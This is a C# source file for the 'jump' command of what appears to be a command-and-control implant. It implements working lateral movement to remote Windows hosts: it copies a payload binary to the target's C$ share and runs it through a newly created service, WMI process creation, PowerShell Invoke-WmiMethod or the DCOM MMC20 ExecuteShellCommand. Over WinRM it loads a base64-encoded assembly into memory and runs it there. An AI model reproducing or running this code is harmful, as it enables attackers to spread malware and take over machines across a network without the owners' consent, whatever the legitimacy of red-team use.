using Engineer.Commands;
using Engineer.Extra;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.InteropServices;
using WSManAutomation;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Management.Automation;
using static System.Collections.Specialized.BitVector32;

namespace Engineer.Commands
{
    internal class jump : EngineerCommand
    {
        public override string Name => "jump";

        public override string Execute(EngineerTask task)
        {
            if (task.Arguments.TryGetValue("/target", out string target))
            {
                target = target.TrimStart(' ');
                Console.WriteLine("Planning to jump to target " + target);
            }
            else
            {
                return "error: " + "No target specified use /target <target>";
            }
            if (task.Arguments.TryGetValue("/method", out string method))
            {
                method = method.TrimStart(' ');
                //ignoring case if the method string does not equal psexec wmi winrm tell the user invalid method and print the valid methods
                if (method.ToLower() == "psexec" || method.ToLower() == "wmi" || method.ToLower() == "winrm" || method.ToLower() == "wmi-ps" || method.ToLower() == "dcom")
                {
                    Console.WriteLine("Using method " + method);
                }
                else
                {
                    return "error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom";
                }
            }
            else
            {
                return "error: " + "No method specified use /method <method>, valid methods are psexec, wmi, winrm, wmi-ps, dcom";
            }
            if (task.File.Length < 1)
            {
                return "error: no file provided";
            }
            var binary = task.File;


            if (method == "psexec")
            {
                jumpPsexec(target, binary);
            }
            if (method == "wmi")
            {
                jumpWmi(target, binary);
            }
            if (method == "wmi-ps")
            {
                jumpWMIPS(target, binary);
            }
            if (method == "winrm")
            {
                jumpWinRM(target, binary);
            }
            if (method == "dcom")
            {
                jumpDcom(target, binary);
            }
            return "Jumped";
        }

        public static void jumpPsexec(string target, byte[] binary)
        {
            // open the service maanger on the target machine and create a new service with a random name that is set to run the binary and then start the service
            IntPtr serviceManagerHandle = WinAPIs.Advapi.OpenSCManager(target, null, WinAPIs.Advapi.SC_MANAGER_ALL_ACCESS);
            if (serviceManagerHandle == IntPtr.Zero)
            {
                Console.WriteLine("error: " + "Failed to open service manager on target machine");
                return;
            }
            // split the binary path into the directory and the binary name, copy the binary name over to the target machine windows directory

            //create random name for the binary
            string binaryName = Path.GetRandomFileName();
            //remove the random file ending and place .exe on the end of the name
            binaryName = binaryName.Remove(binaryName.Length - 4) + ".exe";

            string targetBinaryDirectory = $"\\\\{target}" + "\\C$\\Windows\\" + binaryName;
            File.WriteAllBytes(targetBinaryDirectory, binary);
            //check if the file exists on the target machine, if it does not exist then return an error
            if (!File.Exists(targetBinaryDirectory))
            {
                Console.WriteLine("error: " + "Failed to copy binary to target machine");
                return;
            }
            Console.WriteLine("Copied binary to target machine");
            string targetBinary = targetBinaryDirectory;


            string serviceName = "meteorite_" + Guid.NewGuid().ToString();
            IntPtr serviceHandle = WinAPIs.Advapi.CreateService(serviceManagerHandle, serviceName, serviceName, WinAPIs.Advapi.SERVICE_NO_CHANGE, WinAPIs.Advapi.SERVICE_WIN32_OWN_PROCESS, WinAPIs.Advapi.SERVICE_AUTO_START, WinAPIs.Advapi.SERVICE_ERROR_NORMAL, targetBinary, null, null, null, null, null);
            if (serviceHandle == IntPtr.Zero)
            {
                Console.WriteLine("error: " + "Failed to create service on target machine");
                return;
            }
            if (WinAPIs.Advapi.StartService(serviceHandle, 0, null) == false)
            {
                Console.WriteLine("error: " + "Failed to start service on target machine");
                return;
            }
            Console.WriteLine("Successfully created service on target machine");
            Console.WriteLine("Successfully started service on target machine");
            // close the service manager
            WinAPIs.Advapi.CloseServiceHandle(serviceManagerHandle);
            // close the service
            WinAPIs.Advapi.CloseServiceHandle(serviceHandle);

        }


        public static void jumpWmi(string target, byte[] binary)
        {
            //use system management to upload and execute the binary on the target machine
            ManagementScope scope = new ManagementScope($@"\\{target}\root\cimv2");
            scope.Connect();
            ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null);
            ManagementBaseObject inParams = processClass.GetMethodParameters("Create");

            //create random name for the binary
            string binaryName = Path.GetRandomFileName();
            //remove the random file ending and place .exe on the end of the name
            binaryName = binaryName.Remove(binaryName.Length - 4) + ".exe";

            string targetBinaryDirectory = $"\\\\{target}" + "\\C$\\Windows\\" + binaryName;
            File.WriteAllBytes(targetBinaryDirectory, binary);
            //check if the file exists on the target machine, if it does not exist then return an error
            if (!File.Exists(targetBinaryDirectory))
            {
                Console.WriteLine("error: " + "Failed to copy binary to target machine");
                return;
            }
            Console.WriteLine("Copied binary to target machine");
            string targetBinary = targetBinaryDirectory;

            inParams["CommandLine"] = targetBinary;
            ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
            Console.WriteLine("Successfully created process on target machine");
        }

        public static void jumpWMIPS(string target, byte[] binary)
        {
            //create a powershell object and runner to execute Invoke-WmiMethod -class win32_process -computerName target -name create -argumentList binary
            Console.WriteLine("Testing WMi-Connection and Uploading binary to target Windows dir and then Invoking WMI via powershell to run target binary");
            string testConnection = $"Get-WmiObject -query \"SELECT * FROM Win32_OperatingSystem\" -ComputerName {target}";
            if (!RunPs(testConnection))
            {
                Console.WriteLine("error: " + "Failed to connect to target machine");
                return;
            }
            //create random name for the binary
            string binaryName = Path.GetRandomFileName();
            //remove the random file ending and place .exe on the end of the name
            binaryName = binaryName.Remove(binaryName.Length - 4) + ".exe";            

            string targetBinaryDirectory = $"\\\\{target}" + "\\C$\\Windows\\" + binaryName;
            File.WriteAllBytes(targetBinaryDirectory, binary);
            //check if the file exists on the target machine, if it does not exist then return an error
            if (!File.Exists(targetBinaryDirectory))
            {
                Console.WriteLine("error: " + "Failed to copy binary to target machine");
                return;
            }
            Console.WriteLine("Copied binary to target machine");
            string targetBinary = targetBinaryDirectory;

            string command = $"Invoke-WmiMethod -class win32_process -computerName {target} -name create -argumentList {targetBinary}";
            if (!RunPs(command))
            {
                Console.WriteLine("error: " + "Failed to run command on target machine");
                return;
            }
        }

        public static void jumpWinRM(string target, byte[] binary)
        {
            var uri = new Uri($"http://{target}:5985/WSMAN");
            var conn = new WSManConnectionInfo(uri);
            if (conn.ConnectionUri != null)
            {
                Console.WriteLine("Successfully connected to target machine at " + conn.ConnectionUri);
            }

            string binaryb64 = Convert.ToBase64String(binary);

            var runsapce = RunspaceFactory.CreateRunspace(conn);
            runsapce.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = runsapce;

            ps.AddScript($"$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"{binaryb64}\"));$a.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null");
            // start the invoke but force it to exit after 10 seconds 
            IAsyncResult result = ps.BeginInvoke();
            if (result.AsyncWaitHandle.WaitOne(10000, false))
            {
                ps.EndInvoke(result);
                ps.Dispose();
            }
        }

        public static void jumpDcom(string target, byte[] binary)
        {
            // using the mmc20 com object to execute the binary on the target machine
            Type type = Type.GetTypeFromProgID("MMC20.Application", target);
            object obj = Activator.CreateInstance(type);
            var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);

            //create random name for the binary
            string binaryName = Path.GetRandomFileName();
            //remove the random file ending and place .exe on the end of the name
            binaryName = binaryName.Remove(binaryName.Length - 4) + ".exe";

            string targetBinaryDirectory = $"\\\\{target}" + "\\C$\\Windows\\" + binaryName;
            File.WriteAllBytes(targetBinaryDirectory, binary);
            //check if the file exists on the target machine, if it does not exist then return an error
            if (!File.Exists(targetBinaryDirectory))
            {
                Console.WriteLine("error: " + "Failed to copy binary to target machine");
                return;
            }
            Console.WriteLine("Copied binary to target machine");
            string targetBinary = targetBinaryDirectory;

            var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
            view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view, new object[] { targetBinary, null, null, "7" });
            Console.WriteLine("Successfully executed binary on target machine");
        }

        public static bool RunPs(string command)
        {
            Console.WriteLine("Running command: " + command);
            {
                using (PowerShell ps = PowerShell.Create())
                {

                    ps.AddScript(command);
                    var OutString = true;
                    if (OutString) { ps.AddCommand("Out-String"); }
                    PSDataCollection<object> results = new PSDataCollection<object>();
                    ps.Streams.Error.DataAdded += (sender, e) =>
                    {
                        Console.WriteLine("Error");
                        results.Add("Error");
                        foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
                        {
                            results.Add(er);
                        }
                    };
                    ps.Streams.Verbose.DataAdded += (sender, e) =>
                    {
                        foreach (VerboseRecord vr in ps.Streams.Verbose.ReadAll())
                        {
                            results.Add(vr);
                        }
                    };
                    ps.Streams.Debug.DataAdded += (sender, e) =>
                    {
                        foreach (DebugRecord dr in ps.Streams.Debug.ReadAll())
                        {
                            results.Add(dr);
                        }
                    };
                    ps.Streams.Warning.DataAdded += (sender, e) =>
                    {
                        foreach (WarningRecord wr in ps.Streams.Warning)
                        {
                            results.Add(wr);
                        }
                    };
                    ps.Invoke(null, results);
                    string output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                    ps.Commands.Clear();
                    Console.WriteLine(output);
                    // if output contains the string "Error" then return false
                    if (output.Contains("Error") || output.Contains("error"))
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
            }
        }
    }
}
